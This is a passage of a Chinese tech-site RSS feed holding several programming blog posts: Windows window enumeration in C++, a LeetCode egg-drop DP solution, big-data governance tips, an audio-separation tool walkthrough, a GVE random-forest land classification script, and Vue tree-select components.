height
&gt;
0
&amp;&amp;
param
-&gt;
thumbnail_instance
)
{
if
(
!
param
-&gt;
thumbnail_instance
-&gt;
get_thumbnail_data
(
window
,
param
-&gt;
thumbnail_size
,
const_cast
&lt;
uint8_t
*
*
&gt;
(
&amp;
window_info
.
thumbnail_data
)
,
window_info
.
thumbnail_size
)
)
{
LOG_ERROR
(
"get thumbnail data failed"
)
;
}
}
param
-&gt;
infos
.
push_back
(
window_info
)
;
return
TRUE
;
}
4. 枚举窗口信息
最后，我们需要一个函数来枚举所有窗口的信息。
int
screen_source_info_enumerator
::
enum_screen_source_info
(
const
traa_size icon_size
,
const
traa_size thumbnail_size
,
const
unsigned
int
external_flags
,
traa_screen_source_info
*
*
infos
,
int
*
count
)
{
std
::
unique_ptr
&lt;
thumbnail
&gt;
thumbnail_instance
;
if
(
thumbnail_size
.
width
&gt;
0
&amp;&amp;
thumbnail_size
.
height
&gt;
0
)
{
thumbnail_instance
.
reset
(
new
thumbnail
(
)
)
;
}
enumerator_param param
=
{
icon_size
,
thumbnail_size
,
external_flags
,
{
}
,
thumbnail_instance
.
get
(
)
}
;
BOOL ret
=
::
EnumWindows
(
enum_screen_source_info_proc
,
reinterpret_cast
&lt;
LPARAM
&gt;
(
&amp;
param
)
)
;
if
(
!
ret
)
{
LOG_ERROR
(
"call ::EnumWindows failed: {}"
,
::
GetLastError
(
)
)
;
return
traa_error
::
TRAA_ERROR_ENUM_SCREEN_SOURCE_INFO_FAILED
;
}
*
count
=
static_cast
&lt;
int
&gt;
(
param
.
infos
.
size
(
)
)
;
*
infos
=
reinterpret_cast
&lt;
traa_screen_source_info
*
&gt;
(
new
traa_screen_source_info
[
param
.
infos
.
size
(
)
]
)
;
if
(
*
infos
==
nullptr
)
{
LOG_ERROR
(
"alloca memroy for infos failed: {}"
,
::
GetLastError
(
)
)
;
return
traa_error
::
TRAA_ERROR_OUT_OF_MEMORY
;
}
for
(
size_t i
=
0
;
i
&lt;
param
.
infos
.
size
(
)
;
++
i
)
{
auto
&amp;
source_info
=
param
.
infos
[
i
]
;
auto
&amp;
dest_info
=
(
*
infos
)
[
i
]
;
memcpy
(
&amp;
dest_info
,
&amp;
source_info
,
sizeof
(
traa_screen_source_info
)
)
;
strncpy_s
(
const_cast
&lt;
char
*
&gt;
(
dest_info
.
title
)
,
sizeof
(
dest_info
.
title
)
-
1
,
source_info
.
title
,
std
::
strlen
(
source_info
.
title
)
)
;
strncpy_s
(
const_cast
&lt;
char
*
&gt;
(
dest_info
.
process_path
)
,
sizeof
(
dest_info
.
process_path
)
-
1
,
source_info
.
process_path
,
std
::
strlen
(
source_info
.
process_path
)
)
;
}
return
traa_error
::
TRAA_ERROR_NONE
;
}
总结
通过上述步骤，我们可以在Windows系统中获取可进行屏幕共享捕获的窗口列表，并获取它们的图标和缩略图。这一过程涉及到Windows API的使用、窗口属性的获取、图标和缩略图的处理等多个方面。希望本文能对您有所帮助。
最近有点懒了，这还是copilot生成的。。。
源码传送
traa</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540111.html</guid><pubDate>Fri, 31 Oct 2025 07:24:34 +0000</pubDate></item><item><title>LeetCode 1884.鸡蛋掉落-两枚鸡蛋：动态规划</title><link>https://www.ppmy.cn/news/1540113.html</link><description>【LetMeFly】1884.鸡蛋掉落-两枚鸡蛋：动态规划
力扣题目链接：https://leetcode.cn/problems/egg-drop-with-2-eggs-and-n-floors/
给你
2 枚相同
的鸡蛋，和一栋从第
1
层到第
n
层共有
n
层楼的建筑。
已知存在楼层
f
，满足
0 &lt;= f &lt;= n
，任何从
高于
f
的楼层落下的鸡蛋都
会碎
，从
f
楼层或比它低
的楼层落下的鸡蛋都
不会碎
。
每次操作，你可以取一枚
没有碎
的鸡蛋并把它从任一楼层
x
扔下（满足
1 &lt;= x &lt;= n
）。如果鸡蛋碎了，你就不能再次使用它。如果某枚鸡蛋扔下后没有摔碎，则可以在之后的操作中
重复使用
这枚鸡蛋。
请你计算并返回要确定
f
确切的值
的
最小操作次数
是多少？
示例 1：
输入：
n = 2
输出：
2
解释：
我们可以将第一枚鸡蛋从 1 楼扔下，然后将第二枚从 2 楼扔下。
如果第一枚鸡蛋碎了，可知 f = 0；
如果第二枚鸡蛋碎了，但第一枚没碎，可知 f = 1；
否则，当两个鸡蛋都没碎时，可知 f = 2。
示例 2：
输入：
n = 100
输出：
14
解释：
一种最优的策略是：
- 将第一枚鸡蛋从 9 楼扔下。如果碎了，那么 f 在 0 和 8 之间。将第二枚从 1 楼扔下，然后每扔一次上一层楼，在 8 次内找到 f 。总操作次数 = 1 + 8 = 9 。
- 如果第一枚鸡蛋没有碎，那么再把第一枚鸡蛋从 22 层扔下。如果碎了，那么 f 在 9 和 21 之间。将第二枚鸡蛋从 10 楼扔下，然后每扔一次上一层楼，在 12 次内找到 f 。总操作次数 = 2 + 12 = 14 。
- 如果第一枚鸡蛋没有再次碎掉，则按照类似的方法从 34, 45, 55, 64, 72, 79, 85, 90, 94, 97, 99 和 100 楼分别扔下第一枚鸡蛋。
不管结果如何，最多需要扔 14 次来确定 f 。
提示：
1 &lt;= n &lt;= 1000
解题方法：动态规划
使用
dp[i]
表示
i
层的建筑使用两枚鸡蛋最少的确定次数。初始值
dp[0] = 0
，其余
dp[i] = ∞
。
为了计算
dp[i]
，我们第一枚鸡蛋可以从楼层
j
开始尝试：
若鸡蛋碎了，说明答案在
[1, j - 1]
，并且只剩一枚鸡蛋了，必须从
1
楼开始尝试到
j - 1
楼，所需次数为
1 + (j - 1) = j
；
若鸡蛋没碎，
[1, j - 1]
层直接排除了，对于剩下的
i - j
层，方法和
1
到
i - j
层相同，所需次数为
1 + (dp[i - j])
。
也就是说，第一枚鸡蛋从
j
层开始尝试的话，所需总次数为(一定可以测出安全楼层)
max(j, 1 + dp[i - j])
。
所有
j
中，所需次数最小的那个，即为
dp[i]
的值。
时间复杂度
O ( n 2 ) O(n^2)
O
(
n
2
)
空间复杂度
O ( n ) O(n)
O
(
n
)
AC代码
C++
class
Solution
{
public
:
int
twoEggDrop
(
int
n
)
{
vector
&lt;
int
&gt;
dp
(
n
+
1
,
100000
)
;
dp
[
0
]
=
0
;
for
(
int
i
=
1
;
i
&lt;=
n
;
i
++
)
{
for
(
int
j
=
1
;
j
&lt;=
i
;
j
++
)
{
dp
[
i
]
=
min
(
dp
[
i
]
,
max
(
j
,
dp
[
i
-
j
]
+
1
)
)
;
}
}
return
dp
.
back
(
)
;
}
}
;
Go
package
main
func
twoEggDrop
(
n
int
)
int
{
dp
:=
make
(
[
]
int
,
n
+
1
)
for
i
:=
range
(
dp
)
{
dp
[
i
]
=
10000
}
dp
[
0
]
=
0
for
i
:=
1
;
i
&lt;=
n
;
i
++
{
for
j
:=
1
;
j
&lt;=
i
;
j
++
{
dp
[
i
]
=
min
(
dp
[
i
]
,
max
(
j
,
dp
[
i
-
j
]
+
1
)
)
}
}
return
dp
[
n
]
}
Java
import
java
.
util
.
Arrays
;
class
Solution
{
public
int
twoEggDrop
(
int
n
)
{
int
[
]
dp
=
new
int
[
n
+
1
]
;
Arrays
.
fill
(
dp
,
10000
)
;
dp
[
0
]
=
0
;
for
(
int
i
=
1
;
i
&lt;=
n
;
i
++
)
{
for
(
int
j
=
1
;
j
&lt;=
i
;
j
++
)
{
dp
[
i
]
=
Math
.
min
(
dp
[
i
]
,
Math
.
max
(
j
,
dp
[
i
-
j
]
+
1
)
)
;
}
}
return
dp
[
n
]
;
}
}
Python
class
Solution
:
def
twoEggDrop
(
self
,
n
:
int
)
-
&gt;
int
:
dp
=
[
0
]
+
[
10000
]
*
n
for
i
in
range
(
1
,
n
+
1
)
:
for
j
in
range
(
1
,
i
+
1
)
:
dp
[
i
]
=
min
(
dp
[
i
]
,
max
(
j
,
dp
[
i
-
j
]
+
1
)
)
return
dp
[
-
1
]
同步发文于CSDN和我的个人博客，原创不易，转载经作者同意后请附上原文链接哦~
Tisfy：https://letmefly.blog.csdn.net/article/details/142906976</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540113.html</guid><pubDate>Fri, 31 Oct 2025 07:24:37 +0000</pubDate></item><item><title>大数据治理</title><link>https://www.ppmy.cn/news/1540114.html</link><description>在大数据时代，数据治理已成为确保数据质量、安全性和可用性的关键。然而，许多组织在实施大数据治理时往往忽视了一些高效但不太为人所知的策略。本文将揭示5个可能被忽视但极具价值的大数据治理技巧，帮助你更好地管理和利用数据资产。
1. 利用数据沙箱（Data Sandboxing）进行安全实验
数据沙箱是一个隔离的环境，允许数据科学家和分析师在不影响生产数据的情况下进行实验和分析。
实施步骤：
使用容器技术（如Docker）创建隔离环境
复制一部分生产数据到沙箱环境
为沙箱环境设置严格的访问控制
定期刷新沙箱数据，确保数据的时效性
代码示例（使用Docker创建Python数据科学环境）：
version: '3'
services:jupyter:image: jupyter/datascience-notebookports:- "8888:8888"volumes:- ./notebooks:/home/jovyan/workenvironment:- JUPYTER_ENABLE_LAB=yes
2. 实现数据血缘（Data Lineage）追踪
数据血缘追踪可以帮助你理解数据的来源、变更和流动，这对于确保数据质量和合规性至关重要。
实施步骤：
在数据处理管道中嵌入元数据收集逻辑
使用图数据库（如Neo4j）存储数据血缘信息
开发可视化工具展示数据血缘关系
代码示例（使用Apache Atlas API记录数据血缘）：
import org.apache.atlas.AtlasClientV2;
import org.apache.atlas.model.instance.AtlasEntity;AtlasClientV2 atlasClient = new AtlasClientV2(new String[]{"http://atlas-server:21000"}, new String[]{"admin", "admin"});AtlasEntity.AtlasEntityWithExtInfo entityWithExtInfo = new AtlasEntity.AtlasEntityWithExtInfo();
AtlasEntity entity = new AtlasEntity("Process");
entity.setAttribute("name", "DataTransformation");
entity.setAttribute("inputs", Arrays.asList("hdfs://input/path"));
entity.setAttribute("outputs", Arrays.asList("hdfs://output/path"));entityWithExtInfo.setEntity(entity);
atlasClient.createEntity(entityWithExtInfo);
3. 采用数据合同（Data Contracts）规范数据交互
数据合同是定义数据生产者和消费者之间数据交换规则的正式协议，有助于提高数据质量和一致性。
实施步骤：
定义数据模式（Schema）和质量标准
使用工具（如Apache Avro）实现模式验证
在数据管道中集成合同验证逻辑
代码示例（使用Apache Avro定义数据合同）：
{"type": "record","name": "UserData","fields": [{"name": "id", "type": "string"},{"name": "name", "type": "string"},{"name": "email", "type": "string"},{"name": "age", "type": "int"}]
}
4. 实施数据编目（Data Cataloging）自动化
自动化的数据编目可以帮助组织更好地理解、管理和使用其数据资产。
实施步骤：
使用爬虫技术自动发现和分类数据资产
利用机器学习算法进行数据分类和标记
集成搜索功能，方便用户查找所需数据
代码示例（使用Apache Atlas自动编目）：
from pyatlasclient import Atlasatlas_client = Atlas(host='localhost', port=21000, username='admin', password='admin')def crawl_and_catalog(hdfs_path):for file in list_files(hdfs_path):metadata = extract_metadata(file)entity = {'typeName': 'hdfs_path','attributes': {'name': file.name,'path': file.path,'owner': file.owner,'createTime': file.create_time,'size': file.size}}atlas_client.entity.create(entity)crawl_and_catalog('/data/raw')
5. 建立数据质量防火墙（Data Quality Firewall）
数据质量防火墙可以在数据进入系统之前自动检测和阻止低质量数据，从而提高整体数据质量。
实施步骤：
定义数据质量规则和阈值
在数据摄入层实施实时数据质量检查
配置警报和自动纠正机制
代码示例（使用Apache NiFi实现数据质量检查）：
import org.apache.nifi.processor.AbstractProcessor;
import org.apache.nifi.processor.ProcessContext;
import org.apache.nifi.processor.ProcessSession;public class DataQualityChecker extends AbstractProcessor {@Overridepublic void onTrigger(ProcessContext context, ProcessSession session) throws ProcessException {FlowFile flowFile = session.get();if (flowFile == null) {return;}boolean isQualityMet = checkDataQuality(flowFile);if (isQualityMet) {session.transfer(flowFile, REL_SUCCESS);} else {session.transfer(flowFile, REL_FAILURE);}}private boolean checkDataQuality(FlowFile flowFile) {// 实现数据质量检查逻辑}
}
这些策略虽然不是秘密，但它们常常被忽视或实施不当。正确应用这些技巧，将使你的大数据治理更加高效和有效。希望这篇文章能为你的大数据治理工作带来新的灵感，让我们一起推动大数据治理的发展！</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540114.html</guid><pubDate>Fri, 31 Oct 2025 07:24:39 +0000</pubDate></item><item><title>如何分离人声和背景音乐？精准音频分离，提升你的作品质量</title><link>https://www.ppmy.cn/news/1540115.html</link><description>在音频编辑和处理的领域中，分离人声和背景音乐是一项颇具挑战的任务，但也是众多音频爱好者和专业人士经常面临的需求。无论是为了制作卡拉OK伴奏、提升视频制作质量，还是进行音乐分析和研究，掌握人声与背景音乐的分离技术都显得至关重要。本文将为你详细介绍几种实用的方法，帮助你轻松实现这一需求。
一、了解音频分离的基本原理
音频分离，顾名思义，就是将一个复合音频信号中的不同成分分离开来。在人声和背景音乐的分离中，我们的目标是将原本混合在一起的人声信号和背景音乐信号进行剥离。这通常涉及到频谱分析、信号处理等复杂的技术手段。
二、使用专业的音频编辑软件
对于专业的音频处理需求，使用专业的音频编辑软件是首选方案。市面上有许多功能强大的音频编辑软件，如Adobe Audition、Ableton Live等，它们都提供了丰富的音频处理工具，包括人声和背景音乐的分离功能。
在这些软件中，你通常可以找到诸如“音频分离”、“声音提取”或“频谱编辑”等功能。通过这些功能，你可以对音频进行精细的分析和处理，逐步调整参数，以达到最佳的分离效果。
三、尝试在线音频分离工具
除了专业的音频编辑软件外，还有许多在线音频分离工具可供选择。这些工具无需安装，只需在网页上上传你的音频文件，选择相应的分离选项，即可快速得到分离后的人声和背景音乐。
这里小编就以易我人声分离这款在线的AI音频分离工具为例，来为大家演示一下如何分离人声和背景音乐：
步骤1.
访问并登录易我人声分离官网页面，选择“人声分离”功能。
步骤2.
点击“选择文件”，把音频或者视频文件上传到网页窗口中(或者直接拖拽文件到窗口中)，等待AI处理。
步骤3.
AI处理完成后，会生成伴奏音频和人声音频，点击“下载全部”即可把音频下载到您的电脑上。
注意：请不要忘记下载文件，当您离开此页面后这些文件会自动作废。
四、注意事项与实践建议
在进行人声和背景音乐的分离时，有几点需要注意：
1.分离效果受原始音频质量的影响很大。高质量的音频文件更容易得到理想的分离效果。
2.不同的音频文件可能需要采用不同的分离策略。在实践中，你可能需要多次尝试和调整参数以获得最佳效果。
3.保持耐心和细心。音频分离是一个需要精细操作的过程，急于求成往往难以得到满意的结果。
最后，无论你选择哪种方法进行人声和背景音乐的分离，都请记住：实践是最好的学习方式。只有通过不断的尝试和练习，你才能熟练掌握这项技能，并在音频处理领域发挥更大的创造力。</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540115.html</guid><pubDate>Fri, 31 Oct 2025 07:24:41 +0000</pubDate></item><item><title>中科星图（GVE）——使用随机森林方法进行土地分类</title><link>https://www.ppmy.cn/news/1540116.html</link><description>目录
简介
函数
gve.Classifier.smileRandomForest(numberOfTrees,variablesPerSplit,minLeafPopulation,bagFraction,maxNodes,seed)
代码
结果
简介
使用随机森林方法进行土地分类的步骤如下：
数据准备：收集所需的土地分类数据，并对数据进行预处理，包括缺失值处理、数据标准化等。
特征选择：根据土地特征的重要性选择合适的特征，可以使用特征选择算法如信息增益、方差选择等。
数据集划分：将数据集划分为训练集和测试集，通常采用70%的数据作为训练集、30%的数据作为测试集。
随机森林建模：使用训练集数据建立随机森林模型。随机森林是由多个决策树组成的集成学习模型，每个决策树通过对一部分有放回的样本进行训练而构建。
模型训练：通过训练集数据对随机森林模型进行训练，即对每个决策树进行单独的训练。
模型预测：使用训练好的随机森林模型对测试集数据进行分类预测。
模型评估：对预测结果进行评估，可以使用准确率、精确率、召回率等指标衡量模型的性能。
参数调优：根据模型评估结果，对随机森林模型的参数进行调优，以提高模型的性能。
模型应用：使用经过调优的随机森林模型对新的土地分类数据进行预测。
需要注意的是，随机森林方法在处理高维数据和大数据集时具有较好的性能，但对于类别不平衡的情况可能存在一定的问题。在实际应用中，可以根据具体需求选择合适的模型和算法进行土地分类。
函数
gve.Classifier.smileRandomForest(numberOfTrees,variablesPerSplit,minLeafPopulation,bagFraction,maxNodes,seed)
创建一个空的随机森林分类器
方法参数
- numberOfTrees( number )
创建的决策树数量
- variablesPerSplit( number,optional )
可选参数，每个变量拆分的数量
- minLeafPopulation( number,optional )
可选参数，创建至少包含这些点的节点
- bagFraction( number,optional )
可选参数，每棵树的输入袋比例
- maxNodes( number,optional )
可选参数，每棵树中最大的叶子节点数量
- seed( number,optional )
可选参数，随机种子
返回值: Classifier
代码
/*** @File    :   * @Time    :   2023/08/28* @Author  :   GEOVIS Earth Brain* @Version :   0.1.0* @Contact :   中国(安徽)自由贸易试验区合肥市高新区望江西路900号中安创谷科技园一期A1楼36层* @License :   (C)Copyright 中科星图数字地球合肥有限公司 版权所有* @Desc    :   对影像使用随机森林算法进行分类*/
/** */// 地物分类标签影像
var imgLable = gve.Image("AIRCAS/GLC_FCS30_2020/GLC_FCS30_2020_E115N35");
Map.centerObject(imgLable)
var id = Map.addLayer(imgLable, null, "imgLable");var label = 'LABLE';
var imgLableRemapped = imgLable.rename(label)// Sentinel2 待分类影像
var img = gve.Image("S2/L2A/20221107T024919_20221107T050438_T50SNA").select('B.*');
// print("Sentinel2 img",img);// 获取区域
var ROI = gve.Geometry.Polygon([[[117.15900037027156, 31.807122313784646],[117.15900037027156, 31.633066875770748],[117.65750500894343, 31.633066875770748],[117.65750500894343, 31.807122313784646]]]
);// 波段采样的数量 
var numPoints = 100;
// 分类波段id 
var classBand = label;
// 采样区域 
var region = ROI;
// 缩放 
var scale = 100;
var sample = img.addBands(imgLableRemapped).stratifiedSample(numPoints, classBand, region, scale);
// print('sample',sample)// 样本数据增加随机值属性，用于划分训练数据和验证数据
var sample = sample.randomColumn();// 80%样本用于训练，20%样本用于验证
var trainingSample = sample.filter('random&lt;=0.8');
var validationSample = sample.filter('random&gt;0.8');// 采用欧几里得距离模式训练最小距离分类器
var features = trainingSample;
var classProperty = label;
var inputProperties = img.bandNames();
//gve.Classifier.Cart(maxNodes,minLeafPopulation,maxDepth)
var trainedClassifier = gve.Classifier.smileRandomForest(50).train(features, classProperty, inputProperties);
//gve.Classifier.Cart()
//gve.Classifier.minimumDistance('euclidean', 10)
// print('trainedClassifier',trainedClassifier)
// 打印已训练完的分类器信息
print('Explain of trained classifier', trainedClassifier.explain());
// 获取训练数据的混淆矩阵和整体准确率
var trainedMatrix = trainedClassifier.confusionMatrix();
// print('Training confusion matrix', trainedMatrix);
print('Training overall accuracy', trainedMatrix.accuracy());// 获取验证数据的混淆矩阵和整体准确率
validationSample = validationSample.classify(trainedClassifier);
// print('validationSample',validationSample)// errorMatrix是一个混淆矩阵 
var validationMatrix = validationSample.errorMatrix(label, 'classification');
// print('Validation confusion matrix', validationMatrix);
print('Validation accuracy', validationMatrix.accuracy());// 使用分类器对分类
var imgClassified = img.classify(trainedClassifier);
// print("imgClassified",imgClassified)var classVis = {band_rendering: {uniquevalue: {colortable: {values: [10, 11, 20, 51, 52, 61, 62, 71, 72, 130, 180, 190, 210],colors: ['#FFFF64', '#FFFF64', '#AAF0F0', '#4C7300', '#006400', '#00A000','#AAC800', '#003C00', '#005000', '#FFB432', '#00DC82', '#C31400', '#0046C8'],na: "#000000"}}}
};Map.centerObject(img)
var id1 = Map.addLayer(img, { bands: ['B4', 'B3', 'B2'], min: 100, max: 3500 }, 'img');Map.centerObject(imgClassified)
var id2 = Map.addLayer(imgClassified, { palette: classVis }, 'Classified');
结果
Explain of trained classifier"
2024-10-11 11:00:57.769
▶ Object (15 properties)
2024-10-11 11:00:57.770
"Training overall accuracy"
2024-10-11 11:00:57.770
0.9896680216802168
2024-10-11 11:00:57.770
"Validation accuracy"
2024-10-11 11:00:57.771
0.01386001386001386
2024-10-11 11:02:52.600
"Error: {"message":"参数异常","code":40205}"</description><guid isPermaLink="false">https://www.ppmy.cn/news/1540116.html</guid><pubDate>Fri, 31 Oct 2025 07:24:43 +0000</pubDate></item><item><title>【VUE】封装用户树形选择和部门树形选择控件</title><link>https://www.ppmy.cn/news/1540117.html</link><description>用vue实现封装用户树形选择和部门树形选择控件，采用el-tree。方便各个功能模块的使用和以后的开发。
一、封装用户树形选择控件（userTree.vue）
&lt;
template
&gt;
&lt;
div
style
=
"
padding
:
10px
;
"
&gt;
&lt;!-- 选择人员对话框 --&gt;
&lt;
el-input
placeholder
=
"
输入关键字进行过滤
"
v-model
=
"
filterText
"
&gt;
&lt;/
el-input
&gt;
&lt;
div
v-loading
=
"
loading
"
style
=
"
padding
:
0px 20px
;
overflow-y
:
auto
;
height
:
50vh
;
margin-top
:
10px
;
"
&gt;
&lt;
el-tree
class
=
"
filter-tree
"
:data
=
"
treeData
"
show-checkbox
:props
=
"
defaultProps
"
:filter-node-method
=
"
filterNode
"
:default-checked-keys
=
"
checkedKeys
"
:check-strictly
=
"
singleSelection
"
:default-expanded-keys
=
"
checkedKeys
"
@check
=
"
handleCheckChange
"
ref
=
"
tree
"
node-key
=
"
id
"
&gt;
&lt;/
el-tree
&gt;
&lt;!--  --&gt;
&lt;/
div
&gt;
&lt;
div
slot
=
"
footer
"
class
=
"
dialog-footer
"
style
=
"
text-align
:
right
;
padding-top
:
20px
;
"
&gt;
&lt;
el-button
class
=
"
border_buttom
"
size
=
"
small
"
plain
@click
=
"
cancel
"
&gt;
关 闭
&lt;/
el-button
&gt;
&lt;
el-button
class
=
"
press_button
"
size
=
"
small
"
@click
=
"
handleAddDept
"
&gt;
确 定
&lt;/
el-button
&gt;
&lt;/
div
&gt;
&lt;/
div
&gt;
&lt;/
template
&gt;
&lt;
script
&gt;
import
{
allListUser
}
from
"@/api/system/user"
;
import
{
listDept
}
from
"@/api/system/dept"
;
export
default
{
name
:
"userTree"
,
props
:
{
//选中数据回显
checkedKeys
:
{
type
:
Array
,
default
:
(
)
=&gt;
{
return
[
]
;
}
}
,
//是否开启单选
singleSelection
:
{
type
:
Boolean
,
default
:
(
)
=&gt;
{
return
false
;
}
}
,
}
,
data
(
)
{
return
{
loading
:
true
,
//是否已勾选判断
checkIf
:
false
,
services
:
[
]
,
//选人弹窗
open
:
false
,
//选人过滤
filterText
:
''
,
//树控件数据
treeData
:
null
,
defaultProps
:
{
children
:
'children'
,
label
:
'label'
}
,
selectedMumberList
:
[
]
,
}
}
,
inject
:
[
"selectUser"
,
"closeUserTree"
]
,
watch
:
{
filterText
(
val
)
{
this
.
$refs
.
tree
.
filter
(
val
)
;
}
}
,
created
(
)
{
this
.
getUserTree
(
)
;
}
,
methods
:
{
cancel
(
)
{
this
.
closeUserTree
(
)
this
.
$refs
.
tree
.
setCheckedKeys
(
[
]
)
;
}
,
filterNode
(
value
,
data
)
{
if
(
!
value
)
return
true
;
return
data
.
label
.
indexOf
(
value
)
!==
-
1
;
}
,
handleCheckChange
(
node
,
list
)
{
if
(
this
.
singleSelection
)
{
if
(
node
.
uid
!=
null
)
{
this
.
checkIf
=
true
this
.
selectedMumberList
=
[
]
;
//选中事件在选中后执行，当lis中有两个选中时，使用setCheckedKeys方法，选中一个节点
if
(
list
.
checkedKeys
.
length
==
2
)
{
this
.
$refs
.
tree
.
setCheckedKeys
(
[
node
.
id
]
)
;
}
this
.
selectedMumberList
.
push
(
{
uid
:
node
.
id
,
label
:
node
.
label
,
phonenumber
:
node
.
phonenumber
}
)
}
else
{
this
.
$message
(
{
message
:
'请选择用户数据'
,
type
:
'warning'
}
)
;
}
}
else
{
// 获取选中的子节点列表
this
.
checkIf
=
true
this
.
selectedMumberList
=
this
.
$refs
.
tree
.
getCheckedNodes
(
true
,
false
)
;
this
.
selectedMumberList
=
this
.
selectedMumberList
.
filter
(
obj
=&gt;
{
return
obj
.
uid
!=
null
}
)
}
}
,
/** 确定选择人员 */
handleAddUser
(
)
{
let
arr
=
[
]
let
userIds
=
[
]
let
phonenumbers
=
[
]
let
form
=
{
userNames
:
null
,
userIds
:
null
,
phonenumbers
:
null
,
}
if
(
this
.
checkIf
)
{
this
.
selectedMumberList
.
forEach
(
(
obj
)
=&gt;
{
arr
.
push
(
obj
.
label
)
;
userIds
.
push
(
obj
.
uid
.
replace
(
'u_'
,
''
)
)
;
phonenumbers
.
push
(
obj
.
phonenumber
)
}
)
form
.
userNames
=
arr
.
toString
(
)
form
.
userIds
=
userIds
.
toString
(
)
form
.
phonenumbers
=
phonenumbers
.
toString
(
)
this
.
checkIf
=
false
this
.
selectUser
(
form
)
this
.
$refs
.
tree
.
setCheckedKeys
(
[
]
)
}
else
{
this
.
checkIf
=
false
this
.
closeUserTree
(
)
}
}
,
/** 构建树形数据结构 */
getUserTree
(
)
{
this
.
loading
=
true
//获取所有部门的数据接口
listDept
(
)
.
then
(
res
=&gt;
{
let
deptTree
=
res
.
data
//获取所有用户数据
allListUser
(
)
.
then
(
(
res
)
=&gt;
{
this
.
userList
=
[
]
for
(
let
i
in
res
.
rows
)
{
const
obj
=
{
pid
:
null
,
id
:
null
,
uid
:
null
,
label
:
null
,
phonenumber
:
null
,
}
if
(
res
.
rows
[
i
]
.
deptId
==
null
||
res
.
rows
[
i
]
.
deptId
==
""
)
{
obj
.
pid
=
-
1
}
else
{
obj
.
pid
=
res
.
rows
[
i
]
.
deptId
}
//加‘u_’是为了区分部门id和用户id
obj
.
id
=
"u_"
+
res
.
rows
[
i
]
.
userIdobj
.
uid
=
"u_"
+
res
.
rows
[
i
]
.
userIdobj
.
label
=
res
.
rows
[
i
]
.
userName
//可以按需求补充其他字段，如一下为补充电话号码
obj
.
phonenumber
=
res
.
rows
[
i
]
.
phonenumber
||
'-'
this
.
userList
.
push
(
obj
)
}
this
.
mapTree
(
deptTree
)
this
.
treeData
=
deptTree
this
.
loading
=
false
}
)
;
}
)
}
,
mapTree
(
data
)
{
data
.
forEach
(
ditem
=&gt;
{
//遍历树 拼入相应的user
if
(
this
.
singleSelection
&amp;&amp;
!
ditem
.
uid
)
{
ditem
[
'disabled'
]
=
true
}
this
.
userList
.
forEach
(
uitem
=&gt;
{
if
(
ditem
.
id
==
uitem
.
pid
&amp;&amp;
ditem
.
uid
==
null
)
{
if
(
!
ditem
.
children
)
{
ditem
.
children
=
[
]
}
ditem
.
children
.
push
(
uitem
)
}
}
)
if
(
ditem
.
children
)
{
this
.
mapTree
(
ditem
.
children
)
}
}
)
}
,
}
}
;
&lt;/
script
&gt;
&lt;
style
&gt;
&lt;/
style
&gt;
二、封装部门选择控件（deptTree.vue）
&lt;
template
&gt;
&lt;
div
style
=
"
padding
:
10px
;
"
&gt;
&lt;!-- 选择部门对话框 --&gt;
&lt;
el-input
placeholder
=
"
输入关键字进行过滤
"
v-model
=
"
filterText
"
&gt;
&lt;/
el-input
&gt;
&lt;
div
v-loading
=
"
loading
"
style
=
"
padding
:
0px 20px
;
overflow-y
:
auto
;
height
:
50vh
;
margin-top
:
10px
;
"
&gt;
&lt;
el-tree
class
=
"
filter-tree
"
:data
=
"
treeData
"
show-checkbox
:props
=
"
defaultProps
"
:filter-node-method
=
"
filterNode
"
:default-checked-keys
=
"
checkedDeptKeys
"
default-expand-all
:check-strictly
=
"
singleSelection
"
:default-expanded-keys
=
"
checkedDeptKeys
"
@check
=
"
handleCheckChange
"
ref
=
"
tree
"
node-key
=
"
id
"
&gt;
&lt;/
el-tree
&gt;
&lt;/
div
&gt;
&lt;
div
slot
=
"
footer
"
class
=
"
dialog-footer
"
style
=
"
text-align
:
right
;
padding-top
:
20px
;
"
&gt;
&lt;
el-button
class
=
"
border_buttom
"
size
=
"
small
"
plain
@click
=
"
cancel
"
&gt;
关 闭
&lt;/
el-button
&gt;
&lt;
el-button
class
=
"
press_button
"
size
=
"
small
"
@click
=
"
handleAddDept
"
&gt;
确 定
&lt;/
el-button
&gt;
&lt;/
div
&gt;
&lt;/
div
&gt;
&lt;/
template
&gt;
&lt;
script
&gt;
import
{
listDept
}
from
"@/api/system/dept"
;
export
default
{
name
:
"deptTree"
,
props
:
{
//选中回显
checkedDeptKeys
:
{
type
:
Array
,
default
:
(
)
=&gt;
{
return
[
]
;
}
}
,
//是否单选
singleSelection
:
{
type
:
Boolean
,
default
:
(
)
=&gt;
{
return
false
;
}
}
,
}
,
data
(
)
{
return
{
loading
:
true
,
services
:
[
]
,
//选人弹窗
open
:
false
,
//选人过滤
filterText
:
''
,
//树控件数据
treeData
:
null
,
defaultProps
:
{
children
:
'children'
,
label
:
'label'
}
,
selectedMumberList
:
[
]
,
//是否有选择
checkIf
:
false
,
}
}
,
inject
:
[
"selectDept"
,
"closeDeptTree"
]
,
watch
:
{
filterText
(
val
)
{
this
.
$refs
.
tree
.
filter
(
val
)
;
}
}
,
created
(
)
{
this
.
getDeptTree
(
)
;
}
,
methods
:
{
cancel
(
)
{
this
.
closeDeptTree
(
)
this
.
$refs
.
tree
.
setCheckedKeys
(
[
]
)
;
}
,
filterNode
(
value
,
data
)
{
if
(
!
value
)
return
true
;
return
data
.
label
.
indexOf
(
value
)
!==
-
1
;
}
,
handleCheckChange
(
node
,
list
)
{
if
(
this
.
singleSelection
)
{
this
.
checkIf
=
true
this
.
selectedMumberList
=
[
]
;
//node 该节点所对应的对象、list 树目前的选中状态对象
//选中事件在选中后执行，当lis中有两个选中时，使用setCheckedKeys方法，选中一个节点
if
(
list
.
checkedKeys
.
length
==
2
)
{
//单选实现
this
.
$refs
.
tree
.
setCheckedKeys
(
[
node
.
id
]
)
;
}
this
.
selectedMumberList
.
push
(
{
id
:
node
.
id
,
label
:
node
.
label
}
)
}
else
{
this
.
checkIf
=
true
// 获取选中的子节点列表
this
.
selectedMumberList
=
this
.
$refs
.
tree
.
getCheckedNodes
(
true
,
false
)
;
}
}
,
/** 选择部门 */
handleAddDept
(
)
{
let
arr
=
[
]
let
deptIds
=
[
]
this
.
selectedMumberList
.
forEach
(
(
obj
)
=&gt;
{
arr
.
push
(
obj
.
label
)
;
deptIds
.
push
(
obj
.
id
)
;
}
)
let
